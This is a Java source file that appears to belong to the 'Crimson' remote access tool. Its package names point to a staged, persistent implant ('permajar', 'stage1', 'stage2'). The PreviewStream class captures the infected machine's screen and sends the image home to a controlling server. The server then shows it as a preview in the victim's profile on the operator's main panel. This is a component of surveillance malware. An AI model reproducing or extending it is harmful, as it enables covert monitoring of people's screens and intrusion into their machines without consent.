package subterranean.crimson.universal.streams.previewstream;

import javax.swing.ImageIcon;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.modules.ScreenShot;
import subterranean.crimson.server.graphics.panels.mainscreen.MainPane;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.streams.Stream;

public class PreviewStream extends Stream {

	public PreviewStream(PSParameters p, Connection c) {
		super(p, c);
	}

	public PreviewStream(PSParameters p) {
		super(p);
		start();
	}

	public void setX(int w) {
		getParam().setX(w);
	}

	@Override
	public void received(Message m) {
		// update the profile
		c.getProfile().info.setPreview((ImageIcon) m.auxObject[1]);
		MainPane.dp.updateAll();
	}

	@Override
	public void send() {
		Message m = new Message(Utilities.randId(), BMN.STREAM_data);
		Object[] o = { getStreamID(), ScreenShot.run() };
		m.auxObject = o;

		Communications.sendHome(m);
	}

	private PSParameters getParam() {
		return (PSParameters) param;
	}

}
